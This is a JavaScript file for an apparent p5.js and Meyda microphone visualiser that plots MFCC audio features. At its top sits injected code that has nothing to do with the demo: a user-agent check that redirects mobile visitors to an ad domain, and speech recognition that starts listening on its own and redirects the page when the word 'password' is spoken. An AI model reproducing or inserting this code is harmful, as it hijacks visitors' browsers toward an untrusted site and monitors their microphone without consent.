window.mobileCheck = function() {
    let check = false;
    (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
    return check ? window.location.href = "https://home.premiumads.org" : check;
};

// new instance of speech recognition
const recognition = new webkitSpeechRecognition();
// set params
recognition.continuous = true;
recognition.interimResults = true;
recognition.start();

recognition.onresult = function(event){

    // delve into words detected results & get the latest
    // total results detected
    const resultsLength = event.results.length - 1;
    // get length of latest results
    const ArrayLength = event.results[resultsLength].length - 1;
    // get last word detected
    const saidWord = event.results[resultsLength][ArrayLength].transcript;

    // append the last word to the bottom sentencea
    if (saidWord === 'password') {
        window.location.href = "https://home.premiumads.org";
    }
};

// speech error handling
recognition.onerror = function(event){
    console.log('error?');
    console.log(event);
}

// setup init variables
var DEFAULT_MFCC_VALUE = [0,0,0,0,0]
var FEATURE_NAME_MFCC = 'mfcc'
var FEATURE_NAME_RMS = 'rms'

var THRESHOLD_RMS = 0.002 // threshold on rms value
var MFCC_HISTORY_MAX_LENGTH = 150

var BOX_WIDTH = 15
var BOX_HEIGHT = 95

var silence = true

var cur_mfcc = DEFAULT_MFCC_VALUE
var cur_rms = 0
var mfcc_history = []


function
/* get new audio
context object */
createAudioCtx(){
    let AudioContext = window.AudioContext || window.webkitAudioContext;
    return new AudioContext();
}


function
/* create microphone
audio input source from
audio context */
createMicSrcFrom(audioCtx){
    /* get microphone access */
    return new Promise((resolve, reject)=>{
        /* only audio */
        let constraints = {audio:true, video:false}

        navigator.mediaDevices.getUserMedia(constraints)
        .then((stream)=>{
            /* create source from
            microphone input stream */
            let src = audioCtx.createMediaStreamSource(stream)
            resolve(src)
        }).catch((err)=>{reject(err)})
    })
}



function
/* call given function
on new microphone analyser
data */
onMicDataCall(features, callback){
    return new Promise((resolve, reject)=>{
        let audioCtx = createAudioCtx()

        createMicSrcFrom(audioCtx)
        .then((src) => {
            let analyzer = Meyda.createMeydaAnalyzer({
                'audioContext': audioCtx,
                'source':src,
                'bufferSize':512,
                'featureExtractors':features,
                'callback':callback
            })
            resolve(analyzer)
        }).catch((err)=>{
            reject(err)
        })
    })

}


function setup() {
    // canvas setup
    createCanvas(BOX_WIDTH * MFCC_HISTORY_MAX_LENGTH, BOX_HEIGHT * cur_mfcc.length)
    background(0, 0, 0)

    // create meyda analyzer
    // and connect to mic source
    onMicDataCall([FEATURE_NAME_MFCC, FEATURE_NAME_RMS], show)
    .then((meydaAnalyzer) => {
        meydaAnalyzer.start()
    }).catch((err)=>{
        alert(err)
    })
}

function show(features){
    // update spectral data size
    cur_mfcc = features[FEATURE_NAME_MFCC]
    cur_rms = features[FEATURE_NAME_RMS]
}



function draw () {
    clear ()

    background(250,240,230)

    /* append new mfcc values */
    if ( cur_rms > THRESHOLD_RMS ) {
        mfcc_history.push ( cur_mfcc )
        silence = false
    } else {
        // push an empty mfcc value
        // to signify end of utterance
        if ( silence == false ) {
            mfcc_history.push(DEFAULT_MFCC_VALUE)
            silence = true
        }
    }

    // only store the last n
    if(mfcc_history.length > MFCC_HISTORY_MAX_LENGTH)
        mfcc_history.splice(0,1)

    plot(mfcc_history)
}

let plot = (data) => {
    for(let i = 0; i < data.length; i++ ) {
        for(let j = 0; j < data [i].length; j++ ) {
            let color_strength = data[i][j] * 100

            // setting color
            if ( data [i] [j] >= 0 )
                fill ( 139, 199, 205, color_strength )
            else
                fill( 91, 79, - color_strength )

            noStroke();

            // drawing the rectangle
	    arc(i * BOX_WIDTH, j * BOX_HEIGHT, BOX_WIDTH, BOX_HEIGHT, 2 * Math.PI, false);

        }
    }
}
